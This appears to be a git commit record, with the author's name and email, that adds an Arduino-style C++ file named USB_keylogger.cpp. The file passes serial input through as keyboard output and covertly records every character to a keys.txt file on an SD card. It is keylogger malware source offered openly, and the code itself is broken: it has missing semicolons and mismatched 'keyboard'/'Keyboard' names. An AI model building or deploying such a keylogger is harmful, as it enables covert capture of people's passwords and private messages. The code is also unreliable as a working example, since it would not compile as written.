d92846991579a88db9a715285de51da896d83ef1
aljo <johansson_a95@hotmail.com>
2023-12-17 22:14:55 +0100

    first

---
+++ USB_keylogger.cpp
@@ -0,0 +1,27 @@
+#include <keyboard.h>
+#include <SD.h>
+
+// choose SD card chip pin
+const int  chip = 10
+
+// variable for txt file
+File keylogs
+
+void setup() {
+	keyboard.begin();
+
+	if(SD.begin(chip)) {
+		keylogs = SD.open("keys.txt", FILE_WRITE);
+	}
+}
+
+void loop() {
+	if(Serial.available() > 0) {
+		char keyPress = Serial.read();
+		Keyboard.write(keyPress);
+	
+		if(keylogs) {
+			keylogs.print(keyPress);
+		}
+	}
+}
